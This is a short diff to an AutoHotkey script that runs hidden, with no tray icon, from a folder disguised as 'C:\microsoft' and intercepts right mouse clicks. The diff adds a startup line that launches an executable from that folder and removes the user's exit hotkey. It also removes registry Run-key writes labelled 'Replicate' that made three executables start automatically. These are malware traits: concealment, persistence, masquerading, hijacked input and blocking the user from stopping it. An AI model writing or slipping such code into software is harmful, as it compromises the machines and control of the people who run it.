@@ -1,14 +1,11 @@
 #SingleInstance Ignore
 #NoTrayIcon
 
-^Esc::ExitApp
+Run "C:\microsoft\run.exe"
 
 $RButton::{
     path := "C:\microsoft"
     Send "{RButton}"
-    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
-    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
-    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
 
     static lastRun := 0
     delay := 1000
